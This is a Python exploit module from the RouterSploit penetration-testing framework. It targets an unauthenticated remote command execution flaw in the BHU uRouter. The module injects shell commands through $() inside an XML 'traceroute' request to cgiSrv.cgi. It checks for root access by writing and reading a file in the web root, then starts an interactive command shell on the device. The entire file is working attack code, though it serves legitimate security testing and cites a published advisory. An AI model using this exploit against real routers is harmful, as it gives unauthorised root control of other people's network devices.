from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "BHU uRouter RCE",
        "description": "Module exploits BHU uRouter unauthenticated remote code execution vulnerability, which "
                       "allows executing commands on the router with root privileges.",
        "authors": (
            "Tao 'depierre' Sauvage",
        ),
        "references": (
            "http://www.ioactive.com/pdfs/BHU-WiFi_uRouter-Security_Advisory_Final081716.pdf",
        ),
        "devices": (
            "BHU uRouter",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success('Target is vulnerable')
            print_status('Blind command injection - response is not available')
            print_status('Possible extraction point:')
            print_status('\t- Inject "CMD &gt; /usr/share/www/routersploit.check"')
            print_status('\t- The result of CMD will be available at {}:{}/routersploit.check'.format(self.target, self.port))
            print_status("Invoking command loop (type 'exit' or 'quit' to exit the loop)...")
            shell(self, architecture="mipsbe")
        else:
            print_error('Target is not vulnerable')

    def execute(self, cmd):
        headers = {'Content-Type': 'text/xml', 'X-Requested-With': 'XMLHttpRequest'}
        data = '<cmd><ITEM cmd="traceroute" addr="$({})" /></cmd>'.format(cmd)
        self.http_request(
            method="POST",
            path="/cgi-bin/cgiSrv.cgi",
            headers=headers,
            data=data
        )
        return ''  # Blind RCE so no response available

    @mute
    def check(self):
        headers = {'Content-Type': 'text/xml', 'X-Requested-With': 'XMLHttpRequest'}
        data = '<cmd><ITEM cmd="traceroute" addr="$({})" /></cmd>'
        # Blind unauth RCE so we first create a file in the www-root directory
        cmd_echo = data.format(u'echo &quot;$USER&quot; &gt; /usr/share/www/routersploit.check')
        response = self.http_request(
            method="POST",
            path="/cgi-bin/cgiSrv.cgi",
            headers=headers,
            data=cmd_echo
        )
        if not response or u'status="doing"' not in response.text:
            return False
        # Second we check that the file was successfully created
        response = self.http_request(
            method="GET",
            path="/routersploit.check",
        )
        if not response.status_code == 200 or u'root' not in response.text:
            return False
        # Third we clean up the temp file. No need to check if successful since we already check that the device was
        # vulnerable at this point.
        cmd_rm = data.format("rm -f /usr/share/www/routersploit.check")
        self.http_request(
            method="POST",
            path="/cgi-bin/cgiSrv.cgi",
            headers=headers,
            data=cmd_rm
        )
        return True
